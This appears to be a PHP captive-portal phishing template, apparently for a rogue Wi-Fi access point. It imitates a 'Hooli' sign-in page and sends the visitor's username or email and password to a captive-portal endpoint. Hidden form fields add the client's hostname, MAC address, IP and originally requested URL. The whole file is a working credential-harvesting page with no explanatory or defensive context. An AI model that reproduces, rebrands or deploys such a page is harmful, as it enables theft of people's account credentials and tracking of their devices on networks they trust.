<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Hooli - Sign In</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #FFFFFF;
      color: #000000;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 450px;
      text-align: center;
    }

    .logo img {
      max-width: 350px;
      margin-bottom: 30px;
    }

    .form-container {
      background: #f2f2f2;
      border-radius: 8px;
      padding: 25px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
    }

    .input-field {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      font-size: 16px;
      border-radius: 4px;
      border: 1px solid #ccc;
    }

    .submit-btn {
      width: 100%;
      padding: 12px;
      font-size: 18px;
      border-radius: 20px;
      background: #007bff;
      color: #FFF;
      cursor: pointer;
      border: none;
    }

    .submit-btn:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="assets/img/logo.png" alt="Hooli Logo">
    </div>
    <div class="form-container">
      <form method="POST" action="/captiveportal/index.php">
        <input name="email" type="text" class="input-field" placeholder="Username or Email" required>
        <input name="password" type="password" class="input-field" placeholder="Password" required>

        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="target" value="<?=$destination?>">

        <button type="submit" class="submit-btn">Sign In</button>
      </form>
    </div>
  </div>
</body>
</html>
